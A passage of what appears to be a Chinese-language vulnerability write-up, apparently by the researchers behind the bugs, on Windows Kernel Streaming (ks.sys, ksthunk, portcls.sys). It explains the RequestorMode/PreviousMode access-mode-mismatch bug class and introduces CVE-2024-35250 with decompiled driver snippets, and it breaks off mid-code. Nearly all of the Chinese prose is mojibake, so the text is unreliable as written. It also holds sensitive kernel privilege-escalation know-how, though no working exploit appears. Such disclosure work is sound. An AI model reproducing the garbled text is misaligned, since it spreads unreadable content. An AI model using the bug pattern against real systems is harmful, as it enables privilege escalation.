  &lt;li&gt;
    &lt;p&gt;ÊØèÂÄãË®≠ÂÇô‰∏≠ÁöÑ Property handler
ÊØèÂÄãË®≠ÂÇô‰∏≠ÁöÑ KS Object ÈÉΩÊúâÂêÑËá™ÁöÑ PropertyÔºåËÄå‰∏îÊØèÂÄã Property ÈÉΩÊúâÂêÑËá™ÁöÑÂØ¶‰ΩúÔºåÊúâ‰∫õ Property ËôïÁêÜËµ∑‰æÜÂÆπÊòìÂá∫ÂïèÈ°å„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ks Âèä ksthunk 
ks Âèä ksthunk Â∑≤Á∂ìÊúâÂæàÈï∑‰∏ÄÊÆµÊôÇÈñìÊ≤íÊúâÊºèÊ¥ûÔºå‰ΩÜÂçªÊòØÂÄãÊúÄÂÆπÊòìÊé•Ëß∏Âà∞ÁöÑÂÖ•Âè£ÈªûÔºå‰πüË®±ÊòØ‰∏ÄÂÄãÂ•ΩÁõÆÊ®ôÔºå‰∏ä‰∏ÄÊ¨°Âá∫ÁèæÁöÑÊºèÊ¥ûÊòØÂú® 2020 Âπ¥ &lt;a href=&quot;https://x.com/nghiadt1098&quot;&gt;@nghiadt1098&lt;/a&gt; ÊâÄÊâæÂà∞ÁöÑÂÖ©ÂÄãÊºèÊ¥û &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889&quot;&gt;CVE-2020-16889&lt;/a&gt; Âèä &lt;a href=&quot;https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045&quot;&gt;CVE-2020-17045&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;ÊØèÂÄã driver ÈÉΩÂêÑËá™ËôïÁêÜ‰∏ÄÈÉ®ÂàÜÁöÑÂÖßÂÆπ
Âú® Kernel Streaming ÁöÑÈÉ®ÂàÜÂäüËÉΩ‰∏≠ÔºåÊúâ‰∫õ driver ÊúÉÂêÑËá™ÂÖàËôïÁêÜÈÉ®ÂàÜÁöÑÂÖßÂÆπÔºåÂèØËÉΩÊúÉÈÄ†Êàê‰∏Ä‰∫õ‰∏ç‰∏ÄËá¥ÊÄßÁöÑÂïèÈ°å„ÄÇ&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÊàëÂÄëÈáùÂ∞ç‰∏äÈù¢ÂπæÂÄãËßíÂ∫¶ÂéªÂ∞çÊï¥ÂÄã Kernel Streaming ÂÅö Code Review ÂæåÔºåÂæàÂø´ÁöÑÂ∞±ÁôºÁèæ‰∫ÜÂπæÂÄãÊØîËºÉÂÆπÊòìÁôºÁèæÁöÑÊºèÊ¥û&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;portcls.sys
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38055 (out-of-bounds read when set dataformat for Pin)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38056&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ksthunk
    &lt;ul&gt;
      &lt;li&gt;CVE-2024-38054 (out-of-bounds write)&lt;/li&gt;
      &lt;li&gt;CVE-2024-38057&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;‰∏çÈÅéÊàëÂÄëÈÄô‰∏ÄÁØá‰∏çÊúÉ‰∏Ä‰∏ÄË¨õËß£ÈÄô‰∫õÊºèÊ¥ûÔºåÈÄôÂπæÂÄãÂ§öÊï∏ÈÉΩÊòØÊ≤íÊúâÊ™¢Êü•Èï∑Â∫¶ÊàñÊòØ index ‰πãÈ°ûÁöÑË∂äÁïåÂ≠òÂèñÁ≠âÁ≠âÊòéÈ°ØÁöÑÊ¥ûÔºå‰πüË®±ÊúÉÂú®ÂæåÁ∫åÁöÑÈÉ®ÂàÜÊÖ¢ÊÖ¢‰æÜË¨õËß£Ôºå&lt;a href=&quot;https://x.com/Fr0st1706&quot;&gt;@Fr0st1706&lt;/a&gt; ‰πüÂú®ÂâçÈô£Â≠êÂØ´Âá∫‰∫Ü CVE-2024-38054 ÁöÑ&lt;a href=&quot;https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054&quot;&gt;Âà©Áî®&lt;/a&gt;ÔºåÈÄôÈÇäÂ∞±Êö´ÊôÇÁïôÁµ¶ËÆÄËÄÖÁ†îÁ©∂‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈÄôÁØáË¶ÅÊèêÁöÑÊòØÔºåÊàëÂÄëÂú® Review ÈÅéÁ®ã‰∏≠ÁôºÁèæ‰∫Ü‰∏Ä‰∫õÊúâË∂£ÁöÑ‰∫ãÊÉÖ„ÄÇ&lt;/p&gt;

&lt;p&gt;‰Ω†Ë¶∫Âæó‰∏ãÈù¢ÈÄôÊÆµÁ®ãÂºèÁ¢ºÊòØÂê¶ÂÆâÂÖ®Âë¢Ôºü&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSThunkDevice::CheckIrpForStackAdjustmentNative(__int64 a1, struct _IRP *irp, __int64 a3, int *a4)
{

    if ( irp-&amp;gt;RequestorMode )
    {
        v14 = 0xC0000010;
    }
    else
    {
        UserBuffer = (unsigned int *)irp-&amp;gt;UserBuffer;
        ...
        v14 = (*(__int64 (__fastcall **)(_QWORD, _QWORD, __int64 *))    (Type3InputBuffer + 0x38))(// call Type3InputBuffer+0x38
                *UserBuffer,
                0LL,
               v19);
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ÁúãÂà∞ÈÄôÊÆµÁ®ãÂºèÁ¢ºËÆìÊàëÊÉ≥Ëµ∑‰∫Ü &lt;a href=&quot;https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/&quot;&gt;CVE-2024-21338&lt;/a&gt;ÔºåË©≤ÊºèÊ¥ûÂéüÂÖà‰∏¶Ê≤íÊúâ‰ªª‰ΩïÊ™¢Êü•ÔºåËÄåÂú®‰øÆË£úÂæåÂâáÊòØÊñ∞Â¢û‰∫Ü &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode&quot;&gt;ExGetPreviousMode&lt;/a&gt;Ôºå‰ΩÜÈÄôÈÇäÊ™¢Êü•ÂâáÊòØ‰ΩøÁî®‰∫Ü &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp&quot;&gt;IRP&lt;/a&gt; ‰∏≠ÁöÑ RequestorMode ‰æÜÂÅöÊ™¢Êü•Ôºå‰∏çÈÅé‰∏ÄËà¨ÊÉÖÊ≥Å‰∏ãÂæû‰ΩøÁî®ËÄÖÂëºÂè´ÁöÑ IOCTL ÁöÑ RequestorMode ÈÉΩÊúÉÊòØ UserMode(1) ÊòØ‰∏çÊúÉÊúâÂïèÈ°åÁöÑ„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§ÊôÇÊàëÂèàÊÉ≥Ëµ∑‰æÜ &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; ÁöÑ &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; ÈÄôÁØáÊñáÁ´†„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;the-overlooked-bug-class&quot;&gt;The overlooked bug class&lt;/h2&gt;

&lt;p&gt;ÈÄôÈÇäÊàëÂÄëÂøÖÈ†àÂÖà‰æÜÊèê‰∏Ä‰∏ãÂπæÂÄãÂêçË©ûË∑üÊ¶ÇÂøµÔºå‰∏çÈÅéÂ¶ÇÊûú‰Ω†Â∞ç PreviousMode Âèä RequestorMode ÂæàÁÜüÊÇâÔºåÂèØ‰ª•Ë∑≥Ëá≥ &lt;a href=&quot;#A-logical-bug-class&quot;&gt;A logical bug class&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;previousmode&quot;&gt;PreviousMode&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÂÄãÊòØ PreviousModeÔºåÂú® Application ‰∏≠Â¶ÇÊûú‰ΩøÁî®ËÄÖÈÄèÈÅé Nt* Á≠â System Service Call ‰æÜÂ∞çË®≠ÂÇôÊàñÊ™îÊ°à‰∏≠Êìç‰ΩúÊôÇÔºåÈÄ≤ÂÖ• Kernel ÂæåÂ∞±ÊúÉÂú® &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread&quot;&gt;_ETHREAD&lt;/a&gt; ‰∏≠ÁöÑ PreviousMode Ê®ôË®ª UserMode(1) Ë°®Á§∫ÈÄôÂÄã System Service Call ÊòØ‰æÜËá™ User mode ÁöÑ Application„ÄÇÂ¶ÇÊûú‰Ω†ÊòØÂæû Kernel mode ‰∏≠Ôºå‰æãÂ¶ÇË®≠ÂÇô driver ÂëºÂè´ Zw* System Service Call ÁöÑ API Â∞±ÊúÉÊ®ôË®òÊàê KernelMode(0)„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;requestormode&quot;&gt;RequestorMode&lt;/h3&gt;
&lt;p&gt;Âè¶Â§ñ‰∏ÄÂÄãÈ°û‰ººÁöÑÂâáÊòØ IRP ‰∏≠ÁöÑ RequestorMode ÈÄôÈÇäÂ∞±ÊòØË®òÈåÑ‰Ω†ÂéüÂßãÁöÑ requests ÊòØ‰æÜËá™ UserMode ÈÇÑÊòØ KernelModeÔºåÂú® Kernel driver ‰∏≠ÁöÑÁ®ãÂºèÁ¢ºÊòØÈùûÂ∏∏Â∏∏Áî®Âà∞ÁöÑÊ¨Ñ‰ΩçÔºåÈÄöÂ∏∏ÊúÉ‰æÜËá™ PreviousMode„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂæàÂ∏∏Ë¢´Áî®‰æÜÊ±∫ÂÆöÊòØÂê¶Ë¶ÅÂ∞ç‰æÜËá™‰ΩøÁî®ËÄÖÁöÑ requests ÂÅöÈ°çÂ§ñÊ™¢Êü•ÔºåÂÉèÊòØ Memory Access Check ÊàñÊòØ Security Access CheckÔºå‰æãÂ¶Ç‰∏ãÈù¢ÈÄôÂÄã‰æãÂ≠ê‰∏≠ÔºåÂ¶ÇÊûú requests ‰æÜËá™ UserMode Â∞±ÊúÉÊ™¢Êü•‰ΩøÁî®ËÄÖÊèê‰æõÁöÑ‰ΩçÁΩÆÔºåÂ¶ÇÊûúÊòØÂæû Kernel ‰æÜÁöÑÔºåÂ∞±‰∏çÂÅöÈ°çÂ§ñÊ™¢Êü•Â¢ûÂä†ÊïàÁéá„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰ΩÜÂØ¶Èöõ‰∏äÈÄô‰πüÂá∫Áèæ‰∫Ü‰∏Ä‰∫õÂïèÈ°å‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;a-logical-bug-class&quot;&gt;A logical bug class&lt;/h3&gt;
&lt;p&gt;Âú® &lt;a href=&quot;https://x.com/tiraniddo&quot;&gt;James Forshaw&lt;/a&gt; ÁöÑ &lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt; ‰∏≠ÔºåÂ∞±ÊèêÂà∞‰∫Ü‰∏ÄÁ®Æ Bug Class&lt;/p&gt;

&lt;p&gt;ÈÄôÈÇäÂèØ‰ª•ÂÖàÊÉ≥ÊÉ≥ÁúãÔºå‰ΩøÁî®ËÄÖÂëºÂè´ NtDeviceIoControlFile ‰πãÈ°ûÁöÑ System Service Call ‰πãÂæåÔºåÂ¶ÇÊûúËôïÁêÜÁöÑ driver ÂèàÂéªÁî®‰ΩøÁî®ËÄÖÂèØÊéßÁöÑË≥áÊñô‰æÜ‰ΩúÁÇ∫ ZwOpenFile ÁöÑÂèÉÊï∏ÔºåÊúÉÁôºÁîü‰ªÄÈ∫º‰∫ã&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® driver ÂëºÂè´ ZwOpenFile ‰πãÂæåÔºå PreviousMode ÊúÉËΩâÊèõÊàêÁÇ∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt;Ôºå‰∏¶‰∏îÂú® NtOpenFile ËôïÁêÜÊôÇÔºåÂ∞±ÊúÉÂõ†ÁÇ∫ PreviousMode ÊòØ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; ÁöÑÈóú‰øÇÂ∞ëÊéâÂ§ßÈÉ®ÂàÜÁöÑÊ™¢Êü•ÔºåËÄåÂæåÁ∫åÁöÑ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; ‰πüÊúÉÂõ†Ê≠§ËÆäÊàê &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KernelMode&lt;/code&gt; ÔºåÂæûËÄåÁπûÈÅé Security Access Check Âèä Memory Access Check„ÄÇ‰∏çÈÅéÈÄôÈÇäÂæàÁúãÂæåÁ∫åËôïÁêÜÁöÑ driver ÊÄéÈ∫ºÂéªÂØ¶‰ΩúÈÄô‰∫õÊ™¢Êü•ÔºåÂ¶ÇÊûúÂè™‰æùË≥¥ RequestorMode ‰æÜÊ±∫ÂÆöË¶Å‰∏çË¶ÅÊ™¢Êü•ÔºåÂ∞±ÂèØËÉΩÊúÉÊúâÂïèÈ°å„ÄÇÈÄôÈÇäÁúÅÁï•‰∫Ü‰∏Ä‰∫õÁ¥∞ÁØÄÔºåÂØ¶Èöõ‰∏äÁöÑÁãÄÊ≥ÅÊúÉÁ®çÂæÆÂÜçË§áÈõú‰∏ÄÈªûÈªûÔºå‰πüÊúÉË∑ü CreateFile ÁöÑ flag ÊúâÈóúÔºåÁ¥∞ÁØÄÂèØÂèÉËÄÉ‰∏ãÂàóÂπæÁØáÊñáÁ´† :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html&quot;&gt;Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html&quot;&gt;Hunting for Bugs in Windows Mini-Filter Drivers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/&quot;&gt;Local privilege escalation via the Windows I/O Manager: a variant finding collaboration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôÈÇäÊúâÈÄôÊ®£ÁöÑÊ¶ÇÂøµÂ∞±Â•ΩÔºåÂéüÂÖàÈÄô‰∫õÁ†îÁ©∂‰∏ªË¶ÅÊòØÂú® Zw* Á≥ªÂàóÁöÑ System Service Call ‰∏äÈù¢ÔºåÂ§ßÂÆ∂ÂèØ‰ª•ÊÄùËÄÉ‰∏Ä‰∏ãÔºåÊúâÊ≤íÊúâÂÖ∂‰ªñÈ°û‰ººÁöÑÊÉÖÊ≥ÅÔºå‰πüÂèØËÉΩÈÄ†ÊàêÈÄôÁ®ÆÈÇèËºØÊºèÊ¥ûÂë¢?&lt;/p&gt;

&lt;h4 id=&quot;the-new-bug-pattern&quot;&gt;The new bug pattern&lt;/h4&gt;
&lt;p&gt;‰∫ãÂØ¶‰∏ä‰æÜË™™ÊòØÊúâÁöÑÔºå‰ΩøÁî® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;IoBuildDeviceIoControlRequest&lt;/a&gt; ÈÄôÂÄãÊñπÊ≥ïÂéªÂâµÂª∫‰∏ÄÂÄã DeviceIoControl ÁöÑ IRP ÊôÇÔºåËê¨‰∏ÄÊ≤íÊ≥®ÊÑèÂà∞‰πüÂæàÂÆπÊòìÊúâÈÄôÊ®£ÁöÑÂïèÈ°å„ÄÇÈÄôÂÄã API ‰∏ªË¶ÅÊòØ Kernel driver Áî®‰æÜÂëºÂè´ IOCTL ÁöÑÂÖ∂‰∏≠‰∏ÄÁ®ÆÊñπÊ≥ïÔºåÂÆÉÊúÉÂπ´‰Ω†Âª∫Â•Ω IRPÔºåËÄåÂæåÁ∫åÂú®ÂéªÂëºÂè´ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver&quot;&gt;IofCallDriver&lt;/a&gt;ÔºåÂ∞±ÂèØ‰ª•Âú® Kernel driver ‰∏≠ÂëºÂè´ IOCTL„ÄÇÂú® &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest&quot;&gt;Microsoft Learn&lt;/a&gt; ‰∏≠ÔºåÊúâ‰∏ÄÊÆµË©±ÁâπÂà•ÂÄºÂæóÊ≥®ÊÑè :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰πüÂ∞±ÊòØÈ†êË®≠ÊÉÖÊ≥Å‰∏ãÔºåÂ¶ÇÊûú‰Ω†Ê≤íÊúâÁâπÂà•ÂéªË®≠ÁΩÆ RequestorMode Â∞±ÊúÉÁõ¥Êé•‰ª• KernelMode ÂΩ¢ÂºèÂéªÂëºÂè´ IOCTL„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊåâÁÖßÈÄôÂÄãÊÄùË∑ØÔºåÊàëÂÄëÈáçÊñ∞ÂõûÈ†≠ÂØ©Ë¶ñ‰∏Ä‰∏ãÊàëÂÄëÁöÑÁõÆÊ®ô Kernel StreamingÔºåÊàëÂÄëÁôºÁèæ‰∫Ü‰∏ÄÂÄãÂê∏ÂºïÊàëÂÄëÁöÑÂú∞Êñπ„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Âú® Kernel Streaming ‰∏≠‰ΩøÁî®ÈÄôÂÄã IoBuildDeviceIoControlRequest Âú∞ÊñπÊòØÂú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!KsSynchronousIoControlDevice&lt;/code&gt; ÔºåËÄå‰∏ªË¶ÅÂÖßÂÆπÊòéÈ°ØÂ∞±ÊòØÂú®Áî®ÂâõÂâõÊèêÂà∞ÁöÑÊñπÊ≥ïÔºåÂú® Kernel ‰∏≠ÂëºÂè´ DeviceIoControlÔºå‰∏çÈÅéÈÄôÈÇäÁúã‰ººÊúâÂ•ΩÂ•ΩÁöÑË®≠ÁΩÆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt;Ôºå‰∏îÊúÉÊ†πÊìö KsSynchronousIoControlDevice ÂèÉÊï∏‰∏çÂêåËÄåÂéªË®≠ÁΩÆ‰∏çÂêåÁöÑÊï∏ÂÄºÔºåÂ∞çÊñºÈñãÁôºËÄÖ‰æÜË™™ÊúÉÊòØ‰∏ÄÂÄãÊñπ‰æøÁöÑÂáΩÂºèÂ∫´„ÄÇ&lt;/p&gt;

&lt;p&gt;ÁÑ∂ËÄå‚Ä¶&lt;/p&gt;

&lt;p&gt;ks!CKsPin::GetState
&lt;img src=&quot;/assets/img/blog/20240823/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!SerializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ks!UnserializePropertySet
&lt;img src=&quot;/assets/img/blog/20240823/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÁôºÁèæÂà∞Âú® Kernel Streaming ‰∏≠ÔºåÂÖ®ÈÉ®Êúâ‰ΩøÁî®Âà∞ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; ÁöÑÂú∞ÊñπÈÉΩÊòØÂõ∫ÂÆöÁöÑ‰ΩøÁî® KernelMode(0)ÔºåÂà∞ÈÄôÈÇäÂ∞±ÂèØ‰ª•‰ªîÁ¥∞ÁöÑÊ™¢Êü•ÁúãÁúãÔºåÊúâÁî®Âà∞ÁöÑÂú∞ÊñπÊòØÂê¶ÊúâÂÆâÂÖ®‰∏äÁöÑÂïèÈ°å‰∫Ü„ÄÇÂõ†Ê≠§ÊàëÂÄëÂ∞á Kernel Streaming ‰∏≠ÁöÑ bug pattern ËΩâÊèõÊàê‰∏ãÂàóÂπæÈªû:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Êúâ‰ΩøÁî® KsSynchronousIoControlDevice&lt;/li&gt;
  &lt;li&gt;ÊúâÂèØÊéßÁöÑ
    &lt;ul&gt;
      &lt;li&gt;InputBuffer&lt;/li&gt;
      &lt;li&gt;OutputBuffer&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Á¨¨‰∫åÊ¨°ËôïÁêÜ IOCTL ÁöÑÂú∞ÊñπÊúâ‰æùË≥¥ RequestorMode ÂÅöÂÆâÂÖ®Ê™¢Êü•Ôºå‰∏¶‰∏îÊúâÂèØ‰ª•‰ΩúÁÇ∫ÊèêÊ¨äÂà©Áî®ÁöÑÂú∞Êñπ„ÄÇ
&lt;img src=&quot;/assets/img/blog/20240823/21.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ÊåâÁÖßÈÄôÂÄã Pattern ÊàëÂÄëÂæàÂø´Âú∞Â∞±ÊâæÂà∞‰∫ÜÁ¨¨‰∏ÄÂÄãÊ¥û&lt;/p&gt;

&lt;h2 id=&quot;the-vulnerability--exploitation&quot;&gt;The vulnerability &amp;amp; exploitation&lt;/h2&gt;

&lt;h3 id=&quot;cve-2024-35250&quot;&gt;CVE-2024-35250&lt;/h3&gt;
&lt;p&gt;ÈÄôÂÄãÊºèÊ¥û‰πüÊòØÊàëÂÄë‰ªäÂπ¥Âú® &lt;a href=&quot;https://x.com/thezdi/status/1770517322203070674&quot;&gt;Pwn2Own Vancouver 2024 ‰∏≠ÊâÄ‰ΩøÁî®ÁöÑÊºèÊ¥û&lt;/a&gt;„ÄÇÂú® Kernel Streaming ÁöÑ IOCTL_KS_PROPERTY ÂäüËÉΩ‰∏≠ÔºåÁÇ∫‰∫ÜËÆìÊïàÁéáÂ¢ûÂä†ÔºåÊèê‰æõ‰∫Ü &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_SERIALIZESET&lt;/code&gt; Âíå &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; ÂäüËÉΩÂÖÅË®±‰ΩøÁî®ËÄÖÈÄèÈÅé&lt;strong&gt;ÂñÆ‰∏ÄÂëºÂè´&lt;/strong&gt;ËàáÂ§öÂÄã Property ÈÄ≤Ë°åÊìç‰Ωú„ÄÇÁï∂ÊàëÂÄëÁî®ÈÄôÂäüËÉΩÊôÇÔºåÈÄô‰∫õ requests Â∞áË¢´ KsPropertyHandler ÂáΩÊï∏ÂàÜËß£ÊàêÂ§öÂÄãÂëºÂè´ÔºåË©≥ÊÉÖÂèØÂèÉËÄÉ&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks&quot;&gt;ÈÄôÁØá&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;p&gt;Ë©≤ÂäüËÉΩÂØ¶‰ΩúÂú® ks.sys ‰∏≠&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‰∏äÂúñ‰∏≠ÂèØ‰ª•ÁúãÂà∞ÔºåÂú® ks ËôïÁêÜ Property ÊôÇÔºåÂ¶ÇÊûúÊúâÁµ¶‰∏äËø∞ÁöÑ flag Â∞±ÊúÉÁî± UnserializePropertySet ‰æÜËôïÁêÜ‰Ω†ÁöÑ request&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÈÄôÈÇäÂ∞±ÂÖà‰æÜÁúã‰∏Ä‰∏ã UnserializePropertySet&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
